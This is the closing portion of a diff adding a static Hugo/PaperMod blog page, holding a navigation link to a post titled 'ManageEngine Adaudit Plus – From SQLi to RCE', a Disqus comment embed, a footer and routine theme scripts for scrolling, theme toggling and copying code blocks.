+    <span>ManageEngine Adaudit Plus – From SQLi to RCE</span>
+  </a>
+</nav>
+
+
+
+  </footer><div id="disqus_thread"></div>
+<script>
+(function() {
+var d = document, s = d.createElement('script');
+s.src = 'https://nhienit.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>©nhienit</span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
